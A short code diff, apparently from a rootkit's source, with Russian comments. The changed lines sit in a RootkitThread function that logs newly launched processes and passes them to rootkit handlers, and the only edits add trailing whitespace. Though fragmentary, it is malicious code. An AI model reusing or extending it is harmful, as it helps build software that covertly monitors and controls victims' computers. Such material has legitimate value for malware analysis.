@@ -509,7 +509,7 @@ DWORD WINAPI RootkitThread(LPVOID)
 
 	// Подготавливаем данные для события
 	TEventData Data;
-	ClearStruct(Data);
+	ClearStruct(Data); 
 
 	// Определяем имя приложения
 	string AppName(MAX_PATH);
@@ -522,7 +522,7 @@ DWORD WINAPI RootkitThread(LPVOID)
 //	RTKDBG("rotkit", "Запущен процесс %s, вызван процессом PID=%d", AppName.t_str(), GetParentPID() );
 	RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str() );
 
-	RootkitDoStartApplication(&Data, hashApp);
+	RootkitDoStartApplication(&Data, hashApp); 
 
 	ApplicationStarted(&Data);
 
